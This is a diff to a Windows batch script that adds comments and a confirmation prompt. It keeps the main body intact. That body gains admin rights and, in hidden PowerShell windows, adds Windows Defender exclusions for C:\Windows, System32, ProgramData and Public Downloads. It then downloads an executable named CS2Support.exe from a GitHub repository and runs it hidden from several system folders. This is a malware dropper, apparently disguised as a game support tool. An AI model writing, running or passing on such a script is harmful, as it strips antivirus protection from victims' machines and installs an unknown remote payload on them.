@@ -1,10 +1,20 @@
 @echo off
+:: Check for administrative privileges
 fsutil dirty query %systemdrive% >nul 2>&1
 if %errorlevel% neq 0 (
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
+:: Confirm with the user to continue
+echo This script requires administrative privileges.
+choice /m "Do you want to continue?" /c YN /n
+if %errorlevel% neq 1 (
+    echo Exiting script...
+    exit /b
+)
+
+:: Add exclusions for Windows Defender
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
@@ -12,6 +22,7 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Win
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'CS2Support.exe'"
 
+:: Download and execute files
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Users\Public\Downloads\CS2Support.exe'"
 Start-Process "C:\Users\Public\Downloads\CS2Support.exe" -WindowStyle Hidden
 
@@ -24,4 +35,5 @@ Start-Process "C:\Windows\SysWOW64\CS2Support.exe" -WindowStyle Hidden
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\CS2Support.exe'"
 Start-Process "C:\Windows\CS2Support.exe" -WindowStyle Hidden
 
+:: Open a webpage
 start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
